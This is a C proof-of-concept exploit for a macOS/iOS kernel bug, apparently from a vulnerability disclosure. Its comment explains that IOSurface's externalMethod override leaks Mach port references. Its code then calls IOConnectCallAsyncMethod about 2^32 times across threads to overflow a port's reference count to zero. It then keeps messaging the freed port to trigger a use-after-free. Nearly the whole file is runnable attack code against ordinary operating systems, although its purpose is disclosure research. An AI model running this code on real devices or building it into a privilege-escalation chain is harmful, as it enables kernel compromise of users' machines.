// ianbeer

/*
ipc_port_t reference count leak due to incorrect externalMethod overrides leads to OS X/iOS kernel UaF

IOUserClient subclasses which override IOUserClient::externalMethod need to ensure that if they return
kIOReturnSuccess they actually take ownership of the mach_port_t asyncWakePort if they are called via
IOConnectCallAsyncMethod.

If the userclient code doesn't take ownership of the mach port and returns a success code MIG assumes that
they did take ownership and won't release it's reference on the port. This leads to a reference count leak.

See the previous bug for more in-depth discussion.

This PoC targets IOSurface which was just the first userclient I looked at; I imagine more are vulnerable.
This PoC takes about an hour on 4 core MacBookPro to trigger the kernel UaF.
*/

#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>

#include <mach/mach.h>
#include <mach/mach_error.h>

#include <IOKit/IOKitLib.h>


io_connect_t conn = MACH_PORT_NULL;
mach_port_t overflower = MACH_PORT_NULL;

void leak_one_ref() {
    uint64_t ref = 0x41;
    char output[0x14] = {0};
    size_t outputCnt = 0x14;
    kern_return_t err = IOConnectCallAsyncMethod(
          conn,
          16, // s_get_limits
          overflower,
          &ref,
          1,
          NULL,
          0,
          NULL,
          0,
          NULL,
          0,
          output, // struct output
          &outputCnt);
}

void* leaker_thread(void* arg) {
  uint64_t count = (uint64_t)arg;
  for (uint64_t i = 0; i < count; i++) {
    leak_one_ref();
    if ((i % 0x10000) == 0) {
      float done = (float)i/(float)count;
      fprintf(stdout, "\roverflowing... %3.3f%%", done * 100);
      fflush(stdout);
    }
  }
  return NULL;
}


int main(int argc, char** argv) {
  uint32_t n_threads = 1;
  if (argc > 1) {
    n_threads = atoi(argv[1]);
  }

  if (n_threads < 1 || n_threads > 100) {
    printf("bad thread count\n");
    exit(EXIT_FAILURE);
  }
  printf("running with %d threads\n", n_threads);

  kern_return_t err;
  mach_port_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
  err = IOServiceOpen(service, mach_task_self(), 0, &conn);
  if (err != KERN_SUCCESS) {
    printf("can't get userclient\n");
  }
  IOObjectRelease(service);

  err = mach_port_allocate(mach_task_self(),
                           MACH_PORT_RIGHT_RECEIVE,
                           &overflower);


  /* the port will have one ref (our receive right, held in this process's mach ports table
   * we want to overflow that to 0 such that the next time the kernel copies in the right
   * the ref goes 0 -> 1 then 1 -> 0 when the kernel drops its ref
   * 
   * this will leave us with a dangling mach_port_t pointer in our table
   */
  uint64_t refs_to_leak = 0xffffffff;
  uint64_t per_thread_iters = refs_to_leak/n_threads;
  uint64_t remainder = refs_to_leak % n_threads;


  pthread_t threads[n_threads];
  for(uint32_t i = 0; i < n_threads; i++) {
    uint64_t this_thread_iters = per_thread_iters;
    if (i == 0) { //make up the remainder on the first thread
      this_thread_iters += remainder;
    }
    pthread_create(&threads[i], NULL, leaker_thread, (void*)this_thread_iters);
  }

  for(uint32_t i = 0; i < n_threads; i++) {
    pthread_join(threads[i], NULL);
  }

  // we've overflowed the ref count to 0 now; keep using it, it will get freed and reused:
  for(;;) {
    kern_return_t err;
    mach_msg_header_t msg = {0};
    msg.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0); // no reply port
    msg.msgh_remote_port = overflower;
    msg.msgh_local_port = MACH_PORT_NULL;
    msg.msgh_id = 414141;
    err = mach_msg(&msg,
                   MACH_SEND_MSG|MACH_MSG_OPTION_NONE,
                   (mach_msg_size_t)sizeof(msg),
                   0,
                   MACH_PORT_NULL,
                   MACH_MSG_TIMEOUT_NONE,
                   MACH_PORT_NULL);

    struct resp {
      mach_msg_header_t hdr;
      mach_msg_trailer_t trailer;
    };
    struct resp r = {0};
    err = mach_msg(&(r.hdr),
                   MACH_RCV_MSG|MACH_MSG_OPTION_NONE,
                   0,
                   (mach_msg_size_t)sizeof(r),
                   overflower,
                   MACH_MSG_TIMEOUT_NONE,
                   MACH_PORT_NULL);
  }
  return 0;

}
